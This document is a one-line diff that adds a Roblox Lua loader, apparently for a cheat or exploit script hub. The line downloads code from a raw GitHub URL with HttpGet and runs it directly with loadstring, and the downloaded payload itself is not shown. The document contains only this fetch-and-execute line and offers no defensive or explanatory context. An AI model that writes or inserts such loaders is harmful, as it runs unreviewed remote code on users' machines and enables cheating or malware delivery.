@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/21Nightmare12/Nightmare.cc1/8578a0bac357721bc3b7a309c68e560dfe4c814a/new" ,true))();
